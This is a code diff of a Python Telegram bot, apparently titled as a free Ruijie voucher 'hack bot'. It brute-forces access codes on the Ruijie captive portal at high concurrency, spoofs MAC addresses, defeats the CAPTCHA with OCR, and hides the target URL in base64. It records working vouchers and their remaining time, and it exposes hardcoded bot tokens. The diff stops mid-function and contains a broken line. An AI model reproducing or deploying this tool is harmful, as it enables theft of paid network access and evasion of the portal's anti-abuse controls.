@@ -1,23 +1,49 @@
 # -*- coding: utf-8 -*-
+"""
+LORD OF DARKNESS — Ruijie Voucher Free
+ Bot
+Lord of Darkness| မှ Code Hack Bot | Free Run
+"""
 import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
-from datetime import datetime, timezone
 from telebot.async_telebot import AsyncTeleBot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
 from aiohttp import web
 import cv2, ddddocr, numpy as np
+from datetime import datetime, timedelta, timezone
 from collections import deque
 
-BOT_TOKEN = "8858819080:AAGJNk5Hq1X0E95bBXjvSUFBuT2-N0iRTKY"
+# ════════════════════════════════════════════════════════════════
+#  CONFIG
+# ════════════════════════════════════════════════════════════════
+BOT_TOKEN = "8858819080:AAHcKCb3Ec0X8h5amJaEHWh4AX-TEUVk2OM"
 ADMIN_ID = "7294591323"
 
 # ════════════════════════════════════════════════════════════════
-#  ​ရောင်ရန်မဟုပါ သကယ်လို့​ရောင် ခြင်စိတ်ဖစ်လာရင်
-#            ဖင်သာ​ပြေးခံပါ ════════════════════════════════════════════════════════════════
-CONCURRENCY = 15000
-BATCH_SIZE = 10000
-TIMEOUT = 100
+#  SPEED CONFIG - 5000+ codes/min
+# ════════════════════════════════════════════════════════════════
+CONCURRENCY = 50000          
 
-bot = AsyncTeleBot(BOT_TOKEN)
+BATCH_SIZE = 20000          
+
+TIMEOUT = 200               
+
+# ════════════════════════════════════════════════════════════════
+#  SPEED LIMITER - 5000/min
+# ════════════════════════════════════════════════════════════════
+_last_checks = deque()
+
+async def limit_speed():
+    now = time.time()
+    while _last_checks and now - _last_checks[0] > 60:
+        _last_checks.popleft()
+    if len(_last_checks) >= 50000:
+        await asyncio.sleep(60 - (now - _last_checks[0]) + 0.2)
+    _last_checks.append(time.time())
+
+# ════════════════════════════════════════════════════════════════
+#  GLOBAL STATE
+# ════════════════════════════════════════════════════════════════
+bot = AsyncTeleBot(bot token)
 user_data = {}
 scan_tasks = {}
 success_texts = {}
@@ -25,32 +51,29 @@ limited_texts = {}
 success_messages = {}
 limited_messages = {}
 retry_counts = {}
+captcha_state = {}
 
 session = None
 _connector = None
 _voucher_sem = None
 _start_time = time.monotonic()
-_ocr = None
+_ocr = ddddocr.DdddOcr(show_ad=False)
 
-async def answer_callback(call, text=None, show_alert=False):
-    await bot.answer_callback_query(call.id, text=text, show_alert=show_alert)
-
-def get_ocr():
-    global _ocr
-    if _ocr is None:
-        _ocr = ddddocr.DdddOcr(show_ad=False)
-    return _ocr
-
+# ════════════════════════════════════════════════════════════════
+#  LOCAL PERSISTENCE (No GitHub)
+# ════════════════════════════════════════════════════════════════
 STATE_FILE = "state.json"
 HITS_FILE = "hits.json"
 
 def save_state():
     try:
-        payload = {"user_data": {str(k): v for k, v in user_data.items()}}
+        payload = {
+            "user_data": {str(k): v for k, v in user_data.items()},
+        }
         with open(STATE_FILE, "w") as f:
             json.dump(payload, f)
     except Exception as e:
-        print(f"[err] {e}")
+        print(f"[save_state] error: {e}")
 
 def load_state():
     global user_data
@@ -61,15 +84,16 @@ def load_state():
             payload = json.load(f)
         for k, v in payload.get("user_data", {}).items():
             user_data[int(k)] = v
+        print(f"[startup] Loaded state for {len(user_data)} user(s)")
     except Exception as e:
-        print(f"[err] {e}")
+        print(f"[load_state] error: {e}")
 
 def save_hits():
     try:
         with open(HITS_FILE, "w") as f:
             json.dump({str(k): v for k, v in success_texts.items()}, f, indent=2)
     except Exception as e:
-        print(f"[err] {e}")
+        print(f"[save_hits] error: {e}")
 
 def load_hits():
     try:
@@ -79,12 +103,17 @@ def load_hits():
             payload = json.load(f)
         for k, v in payload.items():
             try:
-                success_texts[int(k)] = v
+                cid = int(k)
             except ValueError:
                 continue
+            success_texts[cid] = v
+        print(f"[startup] Loaded {sum(len(v) for v in success_texts.values())} local hits")
     except Exception as e:
-        print(f"[err] {e}")
+        print(f"[load_hits] error: {e}")
 
+# ════════════════════════════════════════════════════════════════
+#  WEB SERVER
+# ════════════════════════════════════════════════════════════════
 _web_start = time.time()
 
 async def handle(request):
@@ -92,9 +121,10 @@ async def handle(request):
     h, r = divmod(up, 3600)
     m, s = divmod(r, 60)
     return web.json_response({
-        "status": "alive",
-        "bot": "LORD OF DARKNESS MMHA",
-        "uptime": f"{h}h {m}m {s}s"
+        "status": "ok",
+        "bot": "LORD OF DARKNESS",
+        "uptime": f"{h}h {m}m {s}s",
+        "speed": "50000+ codes/min"
     })
 
 async def web_server():
@@ -106,128 +136,39 @@ async def web_server():
     port = int(os.environ.get("PORT", 8099))
     site = web.TCPSite(runner, "0.0.0.0", port)
     await site.start()
+    print(f"🌐 Web server on port {port}")
 
-# ==========================================
-# BUTTON MENUS SYSTEM
-# ==========================================
-
-def main_control_menu(chat_id):
-    has_link = chat_id in user_data and 'session_url' in user_data[chat_id]
-    is_scanning = chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done()
-    
-    markup = InlineKeyboardMarkup(row_width=2)
-    
-    if is_scanning:
-        markup.add(
-            InlineKeyboardButton("🎃 ရပ်တန့်ရန်", callback_data="btn_stop_ritual"),
-            InlineKeyboardButton("☠️ Status", callback_data="btn_realm_status")
-        )
-    else:
-        if not has_link:
-            markup.add(
-                InlineKeyboardButton("☣️ Link ချိတ်ရန်", callback_data="btn_guide_bind"),
-                InlineKeyboardButton("🤖 လမ်းညွှန်", callback_data="btn_ai_guide")
-            )
-        else:
-            markup.add(
-                InlineKeyboardButton("👁️ Scan စတင်ရန်", callback_data="btn_open_scan_menu"),
-                InlineKeyboardButton("🗡️ Recheck", callback_data="btn_recheck_saved")
-            )
-            markup.add(
-                InlineKeyboardButton("⚰️ သိမ်းထားသော Hits", callback_data="btn_view_saved"),
-                InlineKeyboardButton("⚧️ Link ပြောင်းရန်", callback_data="btn_guide_bind")
-            )
-            markup.add(
-                InlineKeyboardButton("☠️ Status", callback_data="btn_realm_status"),
-                InlineKeyboardButton("🤖 လမ်းညွှန်", callback_data="btn_ai_guide")
-            )
-            
-    return markup
-
-def scan_modes_keyboard():
+# ════════════════════════════════════════════════════════════════
+#  UI HELPERS
+# ════════════════════════════════════════════════════════════════
+def main_menu():
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton("🩸 6 လုံး Auto", callback_data="run_scan_6"),
-        InlineKeyboardButton("🩸 8 လုံး Auto", callback_data="run_scan_8"),
-        InlineKeyboardButton("🩸 10 လုံး Random", callback_data="run_scan_10"),
-        InlineKeyboardButton("🩸 12 လုံး Random", callback_data="run_scan_12"),
-        InlineKeyboardButton("👁️ 9 လုံး Custom", callback_data="run_scan_num_9"),
-        InlineKeyboardButton("👁️ 14 လုံး Custom", callback_data="run_scan_num_14"),
-        InlineKeyboardButton("🔤 a-z စာလုံးသေး", callback_data="run_scan_lower"),
-        InlineKeyboardButton("🔤 A-Z စာလုံးကြီး", callback_data="run_scan_upper"),
-        InlineKeyboardButton("🔠 စာလုံး ရောစပ်", callback_data="run_scan_mixcase"),
-        InlineKeyboardButton("🔥 စာလုံး + နံပါတ်", callback_data="run_scan_all"),
-        InlineKeyboardButton("🔙 Main Menu", callback_data="btn_back_main")
+        InlineKeyboardButton("📥 /input", callback_data="menu_input"),
+        InlineKeyboardButton("🔍 /scan", callback_data="menu_scan"),
+        InlineKeyboardButton("🔄 /recheck", callback_data="menu_recheck"),
+        InlineKeyboardButton("📋 /saved", callback_data="menu_saved"),
+        InlineKeyboardButton("⏹ /stop", callback_data="menu_stop"),
+        InlineKeyboardButton("📊 /status", callback_data="menu_status"),
+        InlineKeyboardButton("❓ Help", callback_data="menu_help")
     )
     return markup
 
-def ai_guidance_keyboard():
-    markup = InlineKeyboardMarkup(row_width=1)
+def scan_mode_menu():
+    markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton("🩸 ၁။ Link ချိတ်ဆက်နည်း", callback_data="guide_info_1"),
-        InlineKeyboardButton("👁️ ၂။ Scan Mode အသုံးပြုနည်း", callback_data="guide_info_2"),
-        InlineKeyboardButton("🗡️ ၃။ Hits နှင့် Expiry", callback_data="guide_info_3"),
-        InlineKeyboardButton("⚡ ၄။ Speed နှင့် Error ဖြေရှင်းနည်း", callback_data="guide_info_4"),
-        InlineKeyboardButton("🔙 Main Menu", callback_data="btn_back_main")
+        InlineKeyboardButton("6-digit", callback_data="scan_6"),
+        InlineKeyboardButton("7-digit", callback_data="scan_7"),
+        InlineKeyboardButton("8-digit", callback_data="scan_8"),
+        InlineKeyboardButton("ascii-lower", callback_data="scan_ascii"),
+        InlineKeyboardButton("all (a-z0-9)", callback_data="scan_all"),
+        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
     )
     return markup
 
-def get_spooky_glitch_char():
-    symbols = ['☠️', '🩸', '👁️', '💀', '🕯️', '⚰️', '🧟', '👹']
-    return random.choice(symbols)
-
-def generate_horror_bar(pct, length=12):
-    filled = int(length * (pct / 100))
-    bar = "🩸" * filled + "🕯️" * (length - filled)
-    return f"⚰️ [{bar}] {pct:.1f}% ⚰️"
-
-def format_progress(checked, total=None, speed=0, found=0, retries=0):
-    speed_str = f"{speed:,.0f} souls/min"
-    spooky = get_spooky_glitch_char()
-    
-    if total is not None:
-        pct = (checked / total) * 100 if total > 0 else 0
-        bar = generate_horror_bar(pct)
-        return (
-            f"🩸 <b>[ LORD OF DARKNESS AI RITUAL ]</b> 🩸\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"👁️ <b>RITUAL STATUS</b> : <code>SUMMONING...</code> {spooky}\n"
-            f"☠️ <b>SACRIFICES HITS</b>: <code>{found} SOULS</code>\n"
-            f"⚡ <b>EXECUTION SPEED</b>: <code>{speed_str}</code>\n"
-            f"🩸 <b>CURSED RETRIES</b>  : <code>{retries}</code>\n"
-            f"📦 <b>SOULS DEVOURING</b>: <code>{checked:,}</code> / <code>{total:,}</code>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"{bar}\n"
-            f"<i>\"The LORD OF DARKNESS AI consumes all.\"</i>"
-        )
-    
-    return (
-        f"🩸 <b>[ LORD OF DARKNESS AI RITUAL ]</b> 🩸\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"👁️ <b>RITUAL STATUS</b> : <code>DEVOURING...</code> {spooky}\n"
-        f"☠️ <b>SACRIFICES HITS</b>: <code>{found} SOULS</code>\n"
-        f"⚡ <b>EXECUTION SPEED</b>: <code>{speed_str}</code>\n"
-        f"🩸 <b>CURSED RETRIES</b>  : <code>{retries}</code>\n"
-        f"📦 <b>SOULS DEVOURING</b>: <code>{checked:,}</code>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🕯️ <i>LORD OF DARKNESS AI searching the void...</i>"
-    )
-
-def format_completion(checked, found, elapsed_time):
-    m, s = divmod(int(elapsed_time), 60)
-    time_str = f"{m}m {s}s" if m > 0 else f"{s}s"
-    
-    return (
-        f"⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️\n"
-        f"☠️ <b>LORD OF DARKNESS RITUAL COMPLETED</b> ☠️\n"
-        f"⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️⚰️\n\n"
-        f"🗡️ <b>[ DARKNESS REAP ]</b>\n"
-        f"• <b>Total Devoured</b> : <code>{checked:,} Souls</code>\n"
-        f"• <b>Captured Hits</b>  : <code>{found} Victories</code> 🩸\n"
-        f"• <b>Ritual Time</b>    : <code>{time_str}</code>\n\n"
-        f"👻 <i>The LORD OF DARKNESS AI awaits next order...</i>"
-    )
-
+# ════════════════════════════════════════════════════════════════
+#  PORTAL HELPERS
+# ════════════════════════════════════════════════════════════════
 def get_mac():
     first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
     mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
@@ -250,8 +191,18 @@ async def get_session_id(sess, session_url, previous_session_id=None):
     mac = get_mac()
     url = replace_mac(session_url, new_mac=mac)
     headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9',
+        'priority': 'u=0, i',
+        'referer': url,
+        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
     }
     try:
         async with sess.get(url, headers=headers, allow_redirects=True) as req:
@@ -261,44 +212,77 @@ async def get_session_id(sess, session_url, previous_session_id=None):
     except:
         return previous_session_id
 
-def _ocr_worker(img_bytes):
+# ════════════════════════════════════════════════════════════════
+#  CAPTCHA
+# ════════════════════════════════════════════════════════════════
+def _ocr_sync(img_bytes):
     try:
         arr = np.frombuffer(img_bytes, np.uint8)
         img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
         if img is None:
             return None
         gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-        _, buf = cv2.imencode(".png", gray)
-        return get_ocr().classification(buf.tobytes()).upper()
+        blur = cv2.GaussianBlur(gray, (3, 3), 0)
+        _, thr = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+        _, buf = cv2.imencode(".png", thr)
+        return _ocr.classification(buf.tobytes()).upper()
     except:
         return None
 
-async def parse_captcha_text(img_bytes):
-    return await asyncio.to_thread(_ocr_worker, img_bytes)
+async def Captcha_Text(img_bytes):
+    return await asyncio.to_thread(_ocr_sync, img_bytes)
 
-async def fetch_captcha_img(sess, session_id):
+async def Captcha_Image(sess, session_id):
     headers = {
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
+        'authority': 'portal-as.ruijienetworks.com',
+        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
+        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
+        'sec-fetch-dest': 'image',
+        'sec-fetch-mode': 'no-cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
     }
     params = {'sessionId': session_id, '_t': str(time.time())}
-    try:
-        async with sess.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
-            return await req.read()
-    except:
-        return None
+    async with sess.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
+        return await req.read()
 
-async def verify_captcha(sess, session_id, text):
+async def Varify_Captcha(sess, session_id, text):
     headers = {
+        'authority': 'portal-as.ruijienetworks.com',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
         'content-type': 'application/json',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
+        'origin': 'https://portal-as.ruijienetworks.com',
+        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
     }
     json_data = {'sessionId': session_id, 'authCode': text}
-    try:
-        async with sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
-            data = await req.json()
-            return session_id if data.get("success") else None
-    except:
-        return None
+    async with sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
+        data = await req.json()
+        return session_id if data.get("success") == True else None
+
+# ════════════════════════════════════════════════════════════════
+#  CODE HELPERS
+# ════════════════════════════════════════════════════════════════
+def digit_generator(length):
+    return "".join(random.choice(string.digits) for _ in range(length))
+
+def all_generator(length=6):
+    chars = string.ascii_lowercase + string.digits
+    return "".join(random.choice(chars) for _ in range(length))
+
+def ascii_generator(length=6):
+    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))
 
 def iter_codes(mode):
     if mode in ["6", "7"]:
@@ -307,144 +291,140 @@ def iter_codes(mode):
         random.shuffle(codes)
         yield from codes
         return
-    if mode in ["8", "10", "12"]:
-        length = int(mode)
+    if mode == "8":
         while True:
-            yield "".join(random.choice(string.digits) for _ in range(length))
-            
-    if mode.startswith("num_"):
-        length = int(mode.split("_")[1])
+            yield digit_generator(8)
+    if mode == "ascii-lower":
         while True:
-            yield "".join(random.choice(string.digits) for _ in range(length))
-            
-    if mode == "lower":
-        while True:
-            yield "".join(random.choice(string.ascii_lowercase) for _ in range(8))
-    if mode == "upper":
-        while True:
-            yield "".join(random.choice(string.ascii_uppercase) for _ in range(8))
-    if mode == "mixcase":
-        while True:
-            yield "".join(random.choice(string.ascii_letters) for _ in range(8))
-            
+            yield ascii_generator(6)
     if mode == "all":
-        chars = string.ascii_letters + string.digits
         while True:
-            yield "".join(random.choice(chars) for _ in range(8))
+            yield all_generator(6)
+    raise ValueError(f"Unsupported scan mode: {mode}")
 
-    raise ValueError(f"Invalid mode: {mode}")
-
-def format_minutes(total_minutes):
-    if total_minutes is None or total_minutes == "":
+def Minute_to_Hour(total_minutes):
+    if total_minutes == 'Unknown':
         return 'Unknown'
     try:
-        mins = int(float(total_minutes))
-        if mins < 0:
-            return 'Expired'
-        h, m = divmod(mins, 60)
-        if h > 0 and m > 0:
-            return f"{h}h {m}m"
-        return f"{h}h" if h > 0 else f"{m}m"
+        hours = int(total_minutes) // 60
+        minutes = int(total_minutes) % 60
+        if hours > 0 and minutes > 0:
+            return f"{hours}h {minutes}m"
+        elif hours > 0:
+            return f"{hours}h"
+        else:
+            return f"{minutes}m"
     except:
-        return str(total_minutes)
+        return 'Unknown'
 
-def _find_first_value(value, names):
-    if isinstance(value, dict):
-        for key, item in value.items():
-            if str(key).lower() in names and item is not None and item != "":
-                return item
-        for item in value.values():
-            found = _find_first_value(item, names)
-            if found is not None:
-                return found
-    elif isinstance(value, list):
-        for item in value:
-            found = _find_first_value(item, names)
-            if found is not None:
-                return found
-    return None
-
-def format_expiry_value(value):
-    if value is None or value == "":
-        return None
-    if isinstance(value, (int, float)) or (isinstance(value, str) and value.strip().isdigit()):
-        try:
-            number = float(value)
-            if number > 100000000000:
-                number /= 1000
-            if number > 1000000000:
-                dt = datetime.fromtimestamp(number, tz=timezone.utc).astimezone()
-                return dt.strftime("%Y-%m-%d %H:%M:%S %Z")
-        except (ValueError, OSError, OverflowError):
-            pass
-    raw = str(value).strip()
-    try:
-        parsed = datetime.fromisoformat(raw.replace("Z", "+00:00"))
-        if parsed.tzinfo is None:
-            parsed = parsed.replace(tzinfo=timezone.utc)
-        return parsed.astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")
-    except ValueError:
-        return raw
-
-async def get_expiry_info(session_id):
+async def Code_Expires_Date(session_id):
     headers = {
+        'authority': 'portal-as.ruijienetworks.com',
         'accept': 'application/json, text/javascript, */*; q=0.01',
-        'content-type': 'application/json',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
+        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+        'content-type': 'application/json;',
+        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId=04ecdc104a99406194f594057b21fd21&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Linux"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
     }
     try:
         async with aiohttp.ClientSession(
             connector=_connector,
             connector_owner=False,
-            timeout=aiohttp.ClientTimeout(total=5)
+            cookie_jar=aiohttp.CookieJar(),
+            timeout=aiohttp.ClientTimeout(total=15)
         ) as fresh_session:
             async with fresh_session.get(
-                f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
+                f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
                 headers=headers
             ) as req:
-                res = await req.json()
-                result = res.get('result') or res.get('data') or res
-                profile = _find_first_value(result, {'profilename', 'packagename', 'authprofile', 'plan', 'planname', 'profile'}) or 'Standard'
-                total_mins = _find_first_value(result, {'totalminutes', 'remainingminutes', 'remainminutes', 'remaintime', 'totaltime', 'limittime', 'time', 'duration', 'remainingtime'})
-                expire_date = _find_first_value(result, {'expiretime', 'expiredate', 'expiredtime', 'validityperiod', 'validuntil', 'expiresat', 'expire'})
-                duration = format_minutes(total_mins)
-                info_parts = [f"☠️ Plan: {profile}"]
-                if total_mins is not None and duration != 'Unknown':
-                    info_parts.append(f"⏳ Time: {duration}")
-                else:
-                    info_parts.append("⏳ Time: Unavailable")
-                if expire_date:
-                    info_parts.append(f"📅 Expire: {format_expiry_value(expire_date)}")
-                return " | ".join(info_parts)
+                respond = await req.json()
+                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
+                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
+                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
     except:
-        return "☠️ Plan: Active | ⏳ Time: Unavailable"
+        return "📋 Plan: Unknown | ⏳ Time: Unknown"
 
-VOUCHER_URL = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
+def format_progress(checked, total=None, speed=0, found=0, retries=0):
+    speed_str = f"{speed:,.0f} codes/min"
+    if total is not None:
+        bar_length = 20
+        percent = (checked / total) * 100
+        filled = min(bar_length, int(percent / 5))
+        bar = "█" * filled + "░" * (bar_length - filled)
+        return (
+            f"🔍Scanning Codes...\n\n"
+            f"📦Checked : {checked:,}/{total:,}\n"
+            f"📊Progress : {percent:.2f}%\n"
+            f"⚡Speed : {speed_str}\n"
+            f"✅Found : {found}\n"
+            f"🔁Retry : {retries}\n"
+            f"[{bar}]"
+        )
+    return (
+        f"🔍Scanning Codes...\n\n"
+        f"📦Checked : {checked:,}\n"
+        f"⚡Speed : {speed_str}\n"
+        f"✅Found : {found}\n"
+        f"🔁Retry : {retries}\n"
+        f"📊Status : running\n"
+    )
 
-async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False):
+# ════════════════════════════════════════════════════════════════
+#  PERFORM CHECK (With Speed Limit)
+# ════════════════════════════════════════════════════════════════
+VOUCHER_URL = base64.b64decode(
+    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
+).decode()
+
+async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
+    # ⏱️ Speed limit
+    await limit_speed()
+    
+    global _connector
     if not recheck:
         current_task = scan_tasks.get(chat_id)
-        if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
-            return None
+        if not current_task or current_task.get("scan_id") != scan_id:
+            return
 
-    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
-    try:
-        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as task_session:
+    response = None
+    for attempt in range(3):
+        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
+        async with aiohttp.ClientSession(
+            connector=_connector,
+            connector_owner=False,
+            cookie_jar=aiohttp.CookieJar(),
+            timeout=timeout
+        ) as task_session:
             session_id = await get_session_id(task_session, session_url)
             if not session_id:
-                return None
+                return
 
             auth_code = None
-            for _ in range(2):
-                img = await fetch_captcha_img(task_session, session_id)
-                if not img: continue
-                text = await parse_captcha_text(img)
-                if text and await verify_captcha(task_session, session_id, text):
-                    auth_code = text
-                    break
-            
+            for _ in range(8):
+                try:
+                    image = await Captcha_Image(task_session, session_id)
+                    text = await Captcha_Text(image)
+                    if not text:
+                        continue
+                    if await Varify_Captcha(task_session, session_id, text):
+                        auth_code = text
+                        break
+                except:
+                    continue
             if not auth_code:
-                return None
+                return
+
+            if not recheck:
+                current_task = scan_tasks.get(chat_id)
+                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
+                    return
 
             data = {
                 "accessCode": code,
@@ -453,58 +433,94 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False)
                 "authCode": auth_code,
             }
             headers = {
+                "authority": "portal-as.ruijienetworks.com",
+                "accept": "*/*",
+                "accept-language": "en-US,en;q=0.9",
                 "content-type": "application/json",
-                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
+                "origin": "https://portal-as.ruijienetworks.com",
+                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
+                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+                "sec-ch-ua-mobile": "?1",
+                "sec-ch-ua-platform": '"Android"',
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-origin",
+                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
             }
-            
-            async with task_session.post(VOUCHER_URL, json=data, headers=headers) as req:
-                response = await req.text()
-                
-                if 'logonUrl' in response:
-                    if recheck:
-                        return code
+            try:
+                async with task_session.post(VOUCHER_URL, json=data, headers=headers) as req:
+                    response = await req.text()
+                    print(f"[voucher] code={code} attempt={attempt+1} resp={response[:80]}")
+            except:
+                return
 
-                    if chat_id not in success_texts:
-                        success_texts[chat_id] = []
-                        
-                    expire_info = await get_expiry_info(session_id)
-                    success_texts[chat_id].append(f"🩸 <code>{code}</code>\n └ 🕯️ <i>{expire_info}</i>")
-                    
-                    code_line = "\n".join(success_texts[chat_id])
-                    horror_ui = (
-                        f"👁️ <b>[ LORD OF DARKNESS CAPTURED! ]</b> 🩸\n"
-                        f"☠️━━━━━━━━━━━━━━━━━━━━☠️\n"
-                        f"{code_line}\n"
-                        f"☠️━━━━━━━━━━━━━━━━━━━━☠️\n"
-                        f"👻 <i>Claimed by LORD OF DARKNESS AI...</i>"
-                    )
-                    
+        if response and 'request limited' in response:
+            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
+            await asyncio.sleep(1)
+            continue
+        break
+
+    if not response:
+        return
+
+    if 'logonUrl' in response:
+        if recheck:
+            return code
+
+        if chat_id not in success_texts:
+            success_texts[chat_id] = []
+        expire_date = await Code_Expires_Date(session_id)
+        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
+        code_line = "\n\n".join(success_texts[chat_id])
+        
+        if message:
+            try:
+                if chat_id not in success_messages:
+                    sent = await bot.send_message(chat_id, f"✅ Success Codes:\n\n{code_line}", reply_markup=main_menu())
+                    success_messages[chat_id] = sent.message_id
+                else:
                     try:
-                        if chat_id not in success_messages:
-                            sent = await bot.send_message(chat_id, horror_ui, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
-                            success_messages[chat_id] = sent.message_id
-                        else:
-                            await bot.edit_message_text(chat_id=chat_id, message_id=success_messages[chat_id], text=horror_ui, parse_mode="HTML", reply_markup=main_control_menu(chat_id))
+                        await bot.edit_message_text(chat_id=chat_id, message_id=success_messages[chat_id], text=f"✅ Success Codes:\n\n{code_line}", reply_markup=main_menu())
                     except:
-                        pass
-                    save_hits()
-                    return code
-    except:
-        pass
-    return None
+                        sent = await bot.send_message(chat_id, f"✅ Success Codes:\n\n{code_line}", reply_markup=main_menu())
+                        success_messages[chat_id] = sent.message_id
+            except:
+                pass
+        save_hits()
 
-async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg):
+    elif 'STA' in response:
+        if chat_id not in limited_texts:
+            limited_texts[chat_id] = []
+        expire_date = await Code_Expires_Date(session_id)
+        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
+        limited_line = "\n\n".join(limited_texts[chat_id])
+        if message:
+            try:
+                if chat_id not in limited_messages:
+                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n\n{limited_line}", reply_markup=main_menu())
+                    limited_messages[chat_id] = sent.message_id
+                else:
